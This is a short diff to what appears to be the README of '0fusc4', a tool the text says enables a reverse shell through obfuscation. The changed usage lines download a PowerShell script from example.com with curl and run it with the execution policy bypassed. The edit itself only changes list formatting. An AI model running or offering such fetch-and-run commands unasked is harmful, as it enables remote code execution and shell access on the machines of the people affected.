@@ -11,9 +11,9 @@ Dessa forma, o 0fusc4 possibilita a execução de um shell reverso por meio de u
 
 Use:
 
-# curl -O "http://example.com/0fusc4.ps1"
+- curl -O "http://example.com/0fusc4.ps1"
 
-# powershell.exe -ExecutionPolicy Bypass -File "0fusc4.ps1"
+- powershell.exe -ExecutionPolicy Bypass -File "0fusc4.ps1"
 
 ![image](https://github.com/carlosalbertotuma/0fusc4/assets/13341724/eff83c3f-3887-45a1-8536-d567aa26d52d)
 
